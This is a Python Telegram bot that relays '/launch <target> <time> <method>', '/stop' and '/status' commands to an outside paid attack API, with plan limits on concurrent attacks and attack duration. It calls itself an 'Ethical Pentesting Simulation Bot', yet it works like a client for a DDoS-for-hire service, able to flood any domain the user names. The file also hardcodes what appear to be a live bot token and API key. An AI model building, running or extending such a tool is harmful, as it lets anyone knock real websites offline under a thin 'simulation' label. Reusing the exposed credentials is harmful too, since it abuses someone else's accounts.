import logging
import requests
import json
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# --- Health / port binder for Render ---
class _HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Simple health endpoint, respond OK for GET
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        # suppress default stdout logging from HTTP server
        return

def _start_health_server():
    port = int(os.environ.get("PORT", "10000"))  # Render sets $PORT for you
    server_address = ("0.0.0.0", port)
    httpd = HTTPServer(server_address, _HealthHandler)
    # This blocks inside the thread
    httpd.serve_forever()

# Start HTTP server in a daemon thread so it doesn't block program exit
_health_thread = threading.Thread(target=_start_health_server, daemon=True)
_health_thread.start()


# --- CONFIGURATION ---
# !!! IMPORTANT: REPLACE THESE WITH YOUR ACTUAL TOKENS AND KEY !!!
BOT_TOKEN = "7814912313:AAHyhW2b17XHgfcyw-26wQSKHZSpCpM9uTs"
USER_API_KEY = "38698f04-75e1-4bb6-904e-17850e4ca52d"

# Base URL for the learning platform API
API_BASE_URL = "https://vire.cc/api/v1"

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- UTILITY FUNCTION FOR API CALLS ---

def call_api(path: str, params: dict = None, requires_auth: bool = True) -> dict:
    """
    Handles API calls using the CRITICAL pattern identified in the working script:
    All data is sent via URL Query Parameters (GET request).
    """
    
    if USER_API_KEY == "YOUR_PERSONAL_API_KEY":
        return {"success": False, "error": "Configuration Error: Please set the USER_API_KEY variable in the script."}
    
    full_url = f"{API_BASE_URL}/{path}"
    
    if params is None:
        params = {}

    # 1. AUTHENTICATION LOGIC: Inject API Key into URL Query Parameters (params)
    if requires_auth:
        params['user'] = USER_API_KEY

    try:
        # ALL requests now use GET with parameters, matching the working CLI script
        response = requests.get(full_url, params=params, timeout=10)
            
        # Raise HTTPError if status is 4xx or 5xx (e.g., 400 Bad Request)
        response.raise_for_status() 
        
        data = response.json()
        
        # Check for API-specific error message
        if data.get('success') is False:
            error_message = data.get('error', 'Unknown API Error')
            error_code = data.get('code', 'N/A')
            return {"success": False, "error": f"API Error ({error_code}): {error_message}"}
            
        return {"success": True, "data": data.get('data', data)}
        
    except requests.exceptions.HTTPError as e:
        return {"success": False, "error": f"{e.response.status_code} Client Error: {e.response.reason}"}
    except requests.exceptions.RequestException as e:
        logger.error(f"API Request failed for {full_url}: {e}")
        return {"success": False, "error": f"Connection Error: Could not reach the API. Details: `{e}`"}
    except json.JSONDecodeError:
        return {"success": False, "error": "Invalid API Response: Expected JSON."}
    except Exception as e:
        return {"success": False, "error": f"An unexpected error occurred: {e}"}

# --- TELEGRAM HANDLERS (COMMANDS) ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends the introductory message and command guide."""
    message = (
        "💻 **Ethical Pentesting Simulation Bot**\n\n"
        "Welcome to your stress testing interface! This bot is set up for your course requirements.\n\n"
        "**Primary Commands:**\n"
        "**`/launch <target> <time> <method>`**\n"
        "  - Example: `/launch sample.edu 60 HTTP`\n"
        "**`/stop <attack_id|all>`**\n"
        "  - Example: `/stop 12345` or `/stop all`\n"
        "**`/status <attack_id|all>`**\n"
        "  - Example: `/status 12345` or `/status all`\n\n"
        "**Info Commands:**\n"
        "**`/methods`**: List all available attack methods.\n"
        "**`/user`**: Get your account information.\n"
        "**`/stats`**: Get server statistics (Public).\n"
        "**`/help`**: Show this guide again."
    )
    await update.message.reply_text(message, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Simply calls the start command for help."""
    await start_command(update, context)

async def launch_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles the /launch command to start a stress test."""
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(
            "🛑 **Invalid usage.**\n"
            "Use: `/launch <target> <time_seconds> <method>`\n"
            "Example: `/launch sample.edu 60 HTTP`"
        )
        return

    target, time_str, method = args
    
    try:
        time_int = int(time_str)
    except ValueError:
        await update.message.reply_text("🛑 **Invalid Time.** The time parameter must be a whole number in seconds.")
        return

    # Prepare data for the GET request (sent via params)
    params = {
        "target": target,
        "time": time_int,
        "method": method
    }

    await update.message.reply_text(f"🚀 Attempting to launch {method} attack on `{target}` for {time_int} seconds...", parse_mode='Markdown')
    
    # Authenticated GET request
    response = call_api("start", params=params, requires_auth=True)

    if response["success"]:
        message = response['data'].get('message', 'Attack launched successfully! Check status with /status.')
        await update.message.reply_text(f"✅ **Success!**\n\n{message}", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ **Launch Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles the /stop command to halt an attack."""
    args = context.args
    if not args or len(args) > 1:
        await update.message.reply_text(
            "🛑 **Invalid usage.**\n"
            "Use: `/stop <attack_id>` or `/stop all`\n"
            "Example: `/stop 12345`"
        )
        return
    
    attack_id = args[0]
    params = {}
    
    if attack_id.lower() != 'all':
        params['attack_id'] = attack_id
    
    await update.message.reply_text(f"🛑 Attempting to stop attack(s): `{attack_id}`...", parse_mode='Markdown')
    
    # Authenticated GET request
    response = call_api("stop", params=params, requires_auth=True)

    if response["success"]:
        message = response['data'].get('message', f'Attack(s) `{attack_id}` stopped.')
        await update.message.reply_text(f"✅ **Stop Success!**\n\n{message}", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ **Stop Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def get_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles the /status command to check attack status."""
    args = context.args
    
    attack_id = args[0] if args and len(args) == 1 else 'all'
    
    params = {}

    if attack_id.lower() != 'all':
        params['attack_id'] = attack_id
    
    await update.message.reply_text(f"🔍 Checking status for: `{attack_id}`...", parse_mode='Markdown')
    
    # Authenticated GET request
    response = call_api("status", params=params, requires_auth=True)

    if response["success"]:
        status_data = response["data"]
        
        if isinstance(status_data, list):
            if not status_data:
                info_text = "ℹ️ **Status Check**\n\nNo active attacks found."
            else:
                info_text = "📊 **Active Attacks Found:**\n\n"
                for attack in status_data:
                    info_text += (
                        f"**ID:** `{attack.get('id', 'N/A')}` | "
                        f"**Target:** `{attack.get('target', 'N/A')}`\n"
                        f"**Status:** `{attack.get('status', 'N/A')}` | "
                        f"**Remaining:** `{attack.get('time_remaining', 'N/A')}`s\n"
                        f"----------------------------------------\n"
                    )
        elif isinstance(status_data, dict):
            # Status for a single attack
            info_text = (
                f"📊 **Attack Status ({attack_id})**\n\n"
                f"**Target:** `{status_data.get('target', 'N/A')}`\n"
                f"**Status:** `{status_data.get('status', 'N/A')}`\n"
                f"**Method:** `{status_data.get('method', 'N/A')}`\n"
                f"**Time Left:** `{status_data.get('time_remaining', 'N/A')}` seconds\n"
            )
        else:
            info_text = f"Status data received in an unexpected format: {status_data}"

        await update.message.reply_text(info_text, parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ **Status Check Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def list_methods(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Fetches and displays available attack methods."""
    
    await update.message.reply_text("🔍 Fetching available methods...", parse_mode='Markdown')

    # Authenticated GET request (based on the working CLI script)
    response = call_api("methods", requires_auth=True)

    if response["success"]:
        methods_data = response["data"]
        
        if isinstance(methods_data, dict) and 'methods' in methods_data:
             methods_data = methods_data['methods']

        if isinstance(methods_data, list) and methods_data:
            method_list = "\n".join([f"- `{m}`" for m in methods_data])
            info_text = (
                "📚 **Available Attack Methods**\n\n"
                f"{method_list}"
            )
            await update.message.reply_text(info_text, parse_mode='Markdown')
        else:
            await update.message.reply_text("The API did not return any available methods.", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ **Methods List Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def get_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Fetches and displays user information."""
    
    await update.message.reply_text("🔍 Fetching user information...", parse_mode='Markdown')

    # Authenticated GET request
    response = call_api("user", requires_auth=True)

    if response["success"]:
        user_data = response["data"]
        
        info_text = (
            "👤 **User Account Details**\n\n"
            f"**Plan:** `{user_data.get('plan', 'N/A')}`\n"
            f"**Expires:** `{user_data.get('expire', 'N/A')}`\n"
            f"**Concurrent Limit:** `{user_data.get('concurrent_limit', 'N/A')}`\n"
            f"**Max Time:** `{user_data.get('max_time', 'N/A')}` seconds\n"
            f"**API Key:** `{USER_API_KEY[:4]}...` (hidden for security)\n"
        )
        await update.message.reply_text(info_text, parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ **User Info Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def get_server_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Fetches and displays server statistics."""
    
    await update.message.reply_text("🔍 Fetching server statistics...", parse_mode='Markdown')

    # Unauthenticated GET request (no params, no key sent, based on original doc)
    response = call_api("stats", requires_auth=False)

    if response["success"]:
        stats_data = response["data"]
        
        info_text = "📊 **Server and Platform Statistics**\n\n"
        
        if isinstance(stats_data, dict):
            for key, value in stats_data.items():
                display_key = key.replace('_', ' ').title()
                info_text += f"**{display_key}:** `{value}`\n"
        else:
            info_text += f"Data in unexpected format: `{stats_data}`"

        await update.message.reply_text(info_text, parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ **Stats Failed.**\n\n{response['error']}", parse_mode='Markdown')

# --- MAIN BOT RUNNER ---

def main() -> None:
    """Starts the bot by checking configuration and setting up handlers."""
    
    application = Application.builder().token(BOT_TOKEN).build()

    # Register handlers for commands
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Simulation Commands
    application.add_handler(CommandHandler("launch", launch_attack))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CommandHandler("status", get_status))
    
    # Info Commands
    application.add_handler(CommandHandler("methods", list_methods))
    application.add_handler(CommandHandler("user", get_user_info))
    application.add_handler(CommandHandler("stats", get_server_stats))
    
    # Handle unknown commands
    application.add_handler(MessageHandler(filters.COMMAND, lambda u, c: u.message.reply_text("Unknown command. Use /help to see available commands.")))

    # Run the bot
    logger.info("Bot started successfully. Listening for updates...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
